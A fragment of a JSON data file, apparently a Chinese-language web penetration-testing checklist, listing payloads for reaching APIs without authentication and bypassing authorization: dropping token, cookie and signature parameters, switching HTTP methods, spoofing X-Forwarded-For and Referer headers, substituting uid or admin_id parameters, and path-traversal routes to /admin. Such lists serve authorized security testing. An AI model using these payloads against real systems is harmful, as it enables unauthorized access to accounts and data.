              "id": "auth-no-01",
              "title": "直接访问接口",
              "payload": "/api/user/info\n/api/system/version\n/api/config/get\n/api/export/data"
            },
            {
              "id": "auth-no-02",
              "title": "删除认证参数",
              "payload": "删除 token 参数\n删除 cookie\n删除 sign 签名\n删除 uid 参数"
            },
            {
              "id": "auth-no-03",
              "title": "HTTP 方法绕过",
              "payload": "GET → POST\nPOST → GET\nOPTIONS /api/user/info\nHEAD /api/user/info"
            }
          ]
        },
        {
          "id": "auth_bypass",
          "name": "越权绕过手法",
          "entries": [
            {
              "id": "auth-bypass-01",
              "title": "请求头绕过",
              "payload": "X-Forwarded-For: 127.0.0.1\nX-Real-IP: 127.0.0.1\nRemote-Addr: 127.0.0.1"
            },
            {
              "id": "auth-bypass-02",
              "title": "Referer 绕过",
              "payload": "Referer: 目标域名/admin\nReferer: 目标域名"
            },
            {
              "id": "auth-bypass-03",
              "title": "参数替换绕过",
              "payload": "?id\u003d1\u0026uid\u003d1\n?id\u003d1\u0026user_id\u003d1\n?id\u003d1\u0026admin_id\u003d1"
            },
            {
              "id": "auth-bypass-04",
              "title": "路径遍历绕过",
              "payload": "/api/../admin\n/admin/./user\n/./api/user/info"
            }
          ]
        }
      ]
    },
